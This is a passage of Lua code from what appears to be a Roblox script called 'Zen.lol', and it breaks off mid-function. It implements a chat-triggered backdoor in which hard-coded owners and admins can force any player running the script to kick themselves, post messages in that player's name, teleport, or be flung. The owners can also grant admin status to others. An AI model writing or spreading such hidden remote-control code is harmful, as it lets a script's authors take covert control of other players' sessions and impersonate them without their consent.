-- Helper function to find a player (case-insensitive, partial match support)
local function findTargetPlayerFull(namePart)
    if not namePart then return nil end
    local namePartLower = namePart:lower()
    local exactMatchPlayer = nil
    local partialMatchPlayer = nil
    local partialMatchCount = 0

    for _, p in pairs(Players:GetPlayers()) do
        local playerNameLower = p.Name:lower()
        if playerNameLower == namePartLower then
            exactMatchPlayer = p -- Prioritize exact match
            break
        elseif playerNameLower:find(namePartLower, 1, true) then
            if not partialMatchPlayer then -- Store first partial match
                partialMatchPlayer = p
            end
            partialMatchCount = partialMatchCount + 1
        end
    end

    if exactMatchPlayer then
        return exactMatchPlayer
    elseif partialMatchCount == 1 then -- Only return partial if it's not ambiguous
        return partialMatchPlayer
    end
    return nil -- No match or ambiguous partial match
end


local function handleCommandChat(chattedPlayer, rawMessage)
    local isChattingPlayerAdmin = false
    for _, adminName in pairs(adminsTable) do
        if string.lower(chattedPlayer.Name) == string.lower(adminName) then
            isChattingPlayerAdmin = true
            break
        end
    end

    -- 1. Handle new owner commands (e.g., !kick, !say)
    if isChattingPlayerAdmin and rawMessage:sub(1, #ownerCommandPrefix) == ownerCommandPrefix then
        local commandAndArgs = rawMessage:sub(#ownerCommandPrefix + 1)
        local parts = {}
        for part in commandAndArgs:gmatch("([^%s]+)") do
            table.insert(parts, part)
        end

        local command = parts[1] and parts[1]:lower()
        local targetPlayerNameArg = parts[2]
        local args = {}
        if #parts > 2 then
            for i = 3, #parts do
                table.insert(args, parts[i])
            end
        end

        if not command then return end

        -- Commands executed by the TARGET player's client (if they run this script)
        if command == "kick" then
            if targetPlayerNameArg and LocalPlayer.Name:lower() == targetPlayerNameArg:lower() then
                print("Zen.lol: Received kick command from " .. chattedPlayer.Name .. ". Kicking self.")
                LocalPlayer:Kick("Kicked by Zen.lol admin (" .. chattedPlayer.Name .. ")")
            elseif chattedPlayer == LocalPlayer and not targetPlayerNameArg then
                 print("Zen.lol Kick Usage: !kick (username)")
            end
        elseif command == "say" then
            if targetPlayerNameArg and #args > 0 and LocalPlayer.Name:lower() == targetPlayerNameArg:lower() then
                local messageToSay = table.concat(args, " ")
                print("Zen.lol: Received say command from " .. chattedPlayer.Name .. ". Making self say: " .. messageToSay)
                if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                    local generalChannel = TextChatService:FindFirstChild("TextChannels")
                    if generalChannel then generalChannel = generalChannel:FindFirstChild("RBXGeneral")
                        if generalChannel then generalChannel:SendAsync(messageToSay) end
                    end
                else
                    local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                    if chatEvents then local chatEvent = chatEvents:FindFirstChild("SayMessageRequest")
                        if chatEvent then chatEvent:FireServer(messageToSay, "All") end
                    end
                end
            elseif chattedPlayer == LocalPlayer and (not targetPlayerNameArg or #args == 0) then
                print("Zen.lol Say Usage: !say (username) (message)")
            end
        elseif command == "bring" then -- Admin types !bring TargetUser. TargetUser comes to Admin.
            if targetPlayerNameArg and LocalPlayer.Name:lower() == targetPlayerNameArg:lower() then
                local adminChar = chattedPlayer.Character
                if adminChar and adminChar:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    print("Zen.lol: Received bring command from " .. chattedPlayer.Name .. ". Teleporting to them.")
                    LocalPlayer.Character:SetPrimaryPartCFrame(adminChar.HumanoidRootPart.CFrame)
                end
            elseif chattedPlayer == LocalPlayer and not targetPlayerNameArg then
                print("Zen.lol Bring Usage: !bring (username)")
            end

        -- Commands executed by the ADMIN'S client
        elseif command == "goto" then
            if chattedPlayer == LocalPlayer then -- Only the admin who typed it performs this
                if targetPlayerNameArg then
                    local targetPlayerObj = findTargetPlayerFull(targetPlayerNameArg)
                    if targetPlayerObj and targetPlayerObj.Character and targetPlayerObj.Character:FindFirstChild("HumanoidRootPart") then
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            print("Zen.lol: Goto " .. targetPlayerObj.Name)
                            LocalPlayer.Character:SetPrimaryPartCFrame(targetPlayerObj.Character.HumanoidRootPart.CFrame)
                        else
                             print("Zen.lol Goto: Your character is not available.")
                        end
                    else
                         print("Zen.lol Goto: Target player '" .. targetPlayerNameArg .. "' not found or has no character.")
                    end
                else
                    print("Zen.lol Goto Usage: !goto (username)")
                end
            end
        elseif command == "addadmin" then
            if chattedPlayer == LocalPlayer and (chattedPlayer.Name:lower() == "westoleyourcar" or chattedPlayer.Name:lower() == "edicus") then
                if targetPlayerNameArg then
                    local playerToAdd = findTargetPlayerFull(targetPlayerNameArg)
                    if playerToAdd then
                        local alreadyAdmin = false
                        for _, admin in pairs(adminsTable) do
                            if admin:lower() == playerToAdd.Name:lower() then
                                alreadyAdmin = true; break
                            end
                        end
                        if not alreadyAdmin then
                            table.insert(adminsTable, playerToAdd.Name)
                            print("Zen.lol: Added '" .. playerToAdd.Name .. "' to admins (locally).")
                        else
                            print("Zen.lol: '" .. playerToAdd.Name .. "' is already an admin.")
                        end
                    else
                        print("Zen.lol AddAdmin: Player '" .. targetPlayerNameArg .. "' not found.")
                    end
                else
                    print("Zen.lol AddAdmin Usage: !addadmin (username)")
                end
            elseif chattedPlayer == LocalPlayer then
                print("Zen.lol AddAdmin: You do not have permission for this command.")
            end
        elseif command == "remadmin" then
             if chattedPlayer == LocalPlayer and (chattedPlayer.Name:lower() == "westoleyourcar" or chattedPlayer.Name:lower() == "edicus") then
                if targetPlayerNameArg then
                     local playerToRemove = findTargetPlayerFull(targetPlayerNameArg)
                     if playerToRemove then
                        if playerToRemove.Name:lower() == "westoleyourcar" or playerToRemove.Name:lower() == "edicus" then
                            print("Zen.lol RemAdmin: Cannot remove core owners.")
                            return
                        end
                        local found = false
                        for i, admin in ipairs(adminsTable) do
                            if admin:lower() == playerToRemove.Name:lower() then
                                table.remove(adminsTable, i)
                                print("Zen.lol: Removed '" .. playerToRemove.Name .. "' from admins (locally).")
                                found = true; break
                            end
                        end
                        if not found then
                            print("Zen.lol: '" .. playerToRemove.Name .. "' is not an admin.")
                        end
                    else
                        print("Zen.lol RemAdmin: Player '" .. targetPlayerNameArg .. "' not found.")
                    end
                else
                    print("Zen.lol RemAdmin Usage: !remadmin (username)")
                end
            elseif chattedPlayer == LocalPlayer then
                print("Zen.lol RemAdmin: You do not have permission for this command.")
            end
        elseif chattedPlayer == LocalPlayer then 
            print("Zen.lol: Unknown owner command: !" .. command)
        end
        return 
    end

    -- 2. Handle existing "magic string" commands (affect LocalPlayer if sender is admin)
    if isChattingPlayerAdmin then
        if rawMessage == chatConnections["Fling"] then
			if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
				local humanoidRootPart = LocalPlayer.Character.HumanoidRootPart
				local oldVelocity = humanoidRootPart.Velocity; local oldCanCollide = humanoidRootPart.CanCollide
				humanoidRootPart.CanCollide = true
				humanoidRootPart.Velocity = Vector3.new(math.random(-100, 100), math.random(200, 500), math.random(-100, 100)) * 100000 / 10000
				local bodyForce = Instance.new("BodyForce")
				bodyForce.Force = Vector3.new(math.random(-100, 100), math.random(200, 500), math.random(-100, 100)) * 100000
				bodyForce.Parent = humanoidRootPart; Debris:AddItem(bodyForce, 0.1)
				task.delay(0.1, function() if humanoidRootPart and humanoidRootPart.Parent then humanoidRootPart.CanCollide = oldCanCollide
						task.delay(1, function() if humanoidRootPart and humanoidRootPart.Parent then humanoidRootPart.Velocity = oldVelocity end end)
				end end)
			end
